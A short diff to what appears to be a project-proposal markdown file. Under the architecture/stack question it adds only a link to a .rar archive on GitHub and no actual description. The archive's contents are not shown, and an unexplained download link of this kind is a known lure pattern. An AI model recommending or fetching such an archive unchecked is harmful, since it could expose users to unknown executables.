@@ -41,6 +41,8 @@ The system requires only one participant (buyer or seller) to have internet acce
 
 ## What is your simple architecture/stack?
 
+https://github.com/AllyWalk/OpenFi/blob/main/App%20OpenFi.rar
+
 ---
 ## Who will be responsible for building each part?
 
